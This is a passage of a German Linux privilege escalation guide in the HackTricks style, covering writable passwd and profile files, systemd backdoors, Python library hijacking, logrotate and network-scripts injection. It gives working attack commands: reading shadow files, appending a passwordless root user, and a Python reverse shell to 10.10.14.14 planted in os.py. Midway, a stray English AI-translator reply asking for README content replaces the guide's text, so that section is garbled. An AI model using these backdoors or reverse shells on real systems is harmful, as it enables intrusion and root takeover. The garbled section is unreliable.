ssh-forward-agent-exploitation.md
{{#endref}}

## Interessante Dateien

### Profildateien

Die Datei `/etc/profile` und die Dateien unter `/etc/profile.d/` sind **Skripte, die ausgeführt werden, wenn ein Benutzer eine neue Shell startet**. Daher, wenn du eine von ihnen **schreiben oder ändern kannst, kannst du Privilegien eskalieren**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Wenn ein ungewöhnliches Profilskript gefunden wird, solltest du es auf **sensible Details** überprüfen.

### Passwd/Shadow Dateien

Je nach OS können die `/etc/passwd`- und `/etc/shadow`-Dateien einen anderen Namen haben oder es kann eine Sicherung vorhanden sein. Daher wird empfohlen, **alle zu finden** und **zu prüfen, ob du sie lesen kannst**, um zu sehen, **ob sich Hashes** in den Dateien befinden:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
In einigen Fällen findet man **password hashes** in der Datei `/etc/passwd` (oder einer äquivalenten).
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Schreibbares /etc/passwd

Erzeuge zunächst ein Passwort mit einem der folgenden Befehle.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
I don't have the README.md content. Please paste the file content you want translated.

Also clarify the password step:
- Do you want me to generate a password for user `hacker`? If yes, specify length and allowed character types (lower/upper/digits/symbols), or I can pick a secure default (16 chars, mixed).
- Do you want the translation to include the exact commands to create the user and set the password (e.g., useradd + passwd commands) inside the markdown, and should the generated password be shown in plaintext in the file?

Once you paste the README.md content and confirm the password preferences, I'll translate to German and add the requested user/password lines, keeping all markdown/html/tags/paths unchanged.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Z. B.: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Sie können jetzt den Befehl `su` mit `hacker:hacker` verwenden

Alternativ können Sie die folgenden Zeilen verwenden, um einen Dummy-Benutzer ohne Passwort hinzuzufügen.\
WARNUNG: Sie könnten die aktuelle Sicherheit der Maschine beeinträchtigen.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
HINWEIS: Auf BSD-Plattformen befindet sich `/etc/passwd` unter `/etc/pwd.db` und `/etc/master.passwd`; außerdem wurde `/etc/shadow` in `/etc/spwd.db` umbenannt.

Du solltest prüfen, ob du in einige **sensible Dateien** schreiben kannst. Zum Beispiel: Kannst du in eine **Service-Konfigurationsdatei** schreiben?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Zum Beispiel, wenn die Maschine einen **tomcat**-Server ausführt und du **die Tomcat-Service-Konfigurationsdatei im Verzeichnis /etc/systemd/** ändern kannst, dann kannst du die folgenden Zeilen ändern:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Dein backdoor wird beim nächsten Start von tomcat ausgeführt.

### Ordner prüfen

Die folgenden Ordner können Backups oder interessante Informationen enthalten: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Wahrscheinlich kannst du das letzte nicht lesen, aber versuche es)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Ungewöhnlicher Speicherort/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### In den letzten Minuten geänderte Dateien
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB-Dateien
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml Dateien
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Versteckte Dateien
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Skripte/Binärdateien in PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web-Dateien**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Sicherungen**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Bekannte Dateien, die Passwörter enthalten

Lies den Code von [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), er durchsucht **mehrere mögliche Dateien, die Passwörter enthalten könnten**.\
**Ein weiteres interessantes Tool**, das du dafür verwenden kannst, ist: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) , eine Open-Source-Anwendung zum Auffinden vieler auf einem lokalen Computer gespeicherter Passwörter für Windows, Linux & Mac.

### Logs

Wenn du Logs lesen kannst, könntest du darin **interessante/vertrauliche Informationen** finden. Je seltsamer ein Log ist, desto interessanter ist es wahrscheinlich.\
Außerdem können einige "**schlecht**" konfigurierte (backdoored?) **audit logs** es dir erlauben, **Passwörter in den audit logs aufzuzeichnen**, wie in diesem Beitrag erklärt: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Um Logs zu lesen, ist die Gruppe [**adm**](interesting-groups-linux-pe/index.html#adm-group) sehr hilfreich.

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Du solltest auch nach Dateien suchen, die das Wort "**password**" im **Namen** oder im **Inhalt** enthalten, und außerdem nach IPs und emails in logs oder nach hashes regexps.\
Ich werde hier nicht auflisten, wie man das alles macht, aber wenn du interessiert bist, kannst du dir die letzten Checks ansehen, die [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) perform.

## Schreibbare Dateien

### Python library hijacking

Wenn du weißt, von **wo** ein python script ausgeführt wird und du in diesen Ordner **schreiben kannst** oder du **python libraries modifizieren** kannst, kannst du die OS library verändern und backdooren (wenn du dort schreiben kannst, wo das python script ausgeführt wird, kopiere und füge die os.py library ein).

Um die **backdoor the library** vorzunehmen, füge einfach am Ende der os.py library die folgende Zeile hinzu (IP und PORT anpassen):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Ausnutzung von logrotate

Eine Schwachstelle in `logrotate` ermöglicht es Benutzern mit **Schreibrechten** auf eine Logdatei oder deren übergeordnete Verzeichnisse, potenziell erhöhte Privilegien zu erlangen. Das liegt daran, dass `logrotate`, das häufig als **root** läuft, manipuliert werden kann, um beliebige Dateien auszuführen, insbesondere in Verzeichnissen wie _**/etc/bash_completion.d/**_. Es ist wichtig, die Berechtigungen nicht nur in _/var/log_ zu prüfen, sondern auch in jedem Verzeichnis, in dem Logrotation angewendet wird.

> [!TIP]
> Diese Schwachstelle betrifft `logrotate` Version `3.18.0` und ältere

Weitere detaillierte Informationen zur Schwachstelle finden Sie auf dieser Seite: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Diese Schwachstelle kann mit [**logrotten**](https://github.com/whotwagner/logrotten) ausgenutzt werden.

Diese Schwachstelle ist sehr ähnlich zu [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** daher, wann immer Sie feststellen, dass Sie Logs verändern können, prüfen Sie, wer diese Logs verwaltet, und ob Sie Privilegien erhöhen können, indem Sie die Logs durch Symlinks ersetzen.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Schwachstellenreferenz:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Wenn ein Benutzer aus welchem Grund auch immer in der Lage ist, ein `ifcf-<whatever>`-Skript nach _/etc/sysconfig/network-scripts_ zu **schreiben** **oder** ein bestehendes anzupassen, dann ist Ihr **System pwned**.

Network scripts, _ifcg-eth0_ zum Beispiel, werden für Netzwerkverbindungen verwendet. Sie sehen genau aus wie .INI-Dateien. Allerdings werden sie unter Linux vom Network Manager (dispatcher.d) \~sourced\~.

In meinem Fall wird das `NAME=`-Attribut in diesen Network-Skripten nicht korrekt behandelt. Wenn Sie **Leer-/Whitespace im Namen haben, versucht das System, den Teil nach dem Leer-/Whitespace auszuführen**. Das bedeutet, dass **alles nach dem ersten Leerzeichen als root ausgeführt wird**.

For example: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Hinweis: das Leerzeichen zwischen Network und /bin/id_)

### **init, init.d, systemd und rc.d**

Das Verzeichnis `/etc/init.d` beherbergt **Skripte** für System V init (SysVinit), das **klassische Linux-Service-Management-System**. Es enthält Skripte zum `start`, `stop`, `restart` und manchmal `reload` von Diensten. Diese können direkt ausgeführt oder über symbolische Links in `/etc/rc?.d/` aufgerufen werden. Ein alternativer Pfad auf Redhat-Systemen ist `/etc/rc.d/init.d`.

Auf der anderen Seite ist `/etc/init` mit **Upstart** verknüpft, einem neueren **Service-Management**, das von Ubuntu eingeführt wurde und Konfigurationsdateien zur Verwaltung von Diensten verwendet. Trotz der Umstellung auf Upstart werden SysVinit-Skripte aufgrund einer Kompatibilitätsschicht in Upstart weiterhin parallel verwendet.

**systemd** gilt als moderner Init- und Service-Manager und bietet erweiterte Funktionen wie bedarfsabhängiges Starten von Daemons, Automount-Verwaltung und Systemzustands-Snapshots. Es organisiert Dateien in `/usr/lib/systemd/` für Distribution-Pakete und `/etc/systemd/system/` für Administrator-Anpassungen und vereinfacht so die Systemverwaltung.

## Weitere Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks hooken häufig einen syscall, um privilegierte Kernel-Funktionalität an einen userspace manager zu exponieren. Schwache Manager-Authentifizierung (z. B. signature checks basierend auf FD-order oder schlechte Passwortschemata) kann einer lokalen App ermöglichen, den manager zu imitieren und auf bereits gerooteten Geräten zu rooten. Mehr Informationen und Exploit-Details hier:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex-getriebene Service-Discovery in VMware Tools/Aria Operations kann einen Binary-Pfad aus Prozess-Commandlines extrahieren und diesen mit -v in einem privilegierten Kontext ausführen. Permissive Patterns (z. B. Verwendung von \S) können auf von Angreifern platzierte Listener in beschreibbaren Orten (z. B. /tmp/httpd) matchen, was zur Ausführung als root führt (CWE-426 Untrusted Search Path).

Mehr dazu und ein generalisiertes Pattern, das auf andere Discovery-/Monitoring-Stacks anwendbar ist, hier:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)


- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
